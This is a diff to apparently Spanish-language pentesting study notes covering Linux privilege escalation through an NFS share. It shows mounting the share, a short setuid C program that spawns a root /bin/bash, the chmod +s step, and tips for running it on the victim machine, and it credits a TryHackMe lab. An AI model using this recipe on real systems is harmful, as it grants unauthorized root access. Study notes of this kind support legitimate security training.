@@ -447,14 +447,14 @@ mkdir /tmp/backupsonattackermachine
 
 mount -o rw 10.0.2.12:/backups /tmp/backupsonattackermachine
 ```
-Un simple ejecutable que nos permita usar /bin/bash
+Un simple ejecutable que nos permita usar /bin/bash (Esto se encontró en uno de los laboratorios de Tryhackme)
 
 ```s
 int main()
 { setgid(0);
   setuid(0);
   system("/bin/bash");
-  return 0
+  return 0;
 }
 ```
 
@@ -466,6 +466,10 @@ chmod +s nfs
 
 ls -l nfs
 ```
+
+Después solamente en la máquina victima tendremos que ejecutar este compilable conun ./ bastará
+Otra opción más sencilla es copiar el /bin/bash a la máquina victima y podremos usar este bash privilegiado ahora.
+
 ### [](#header-3)Kernel Exploits
 La metodolgia es sencilla, solamente hay que:
 	1. Identificar la version de kernel
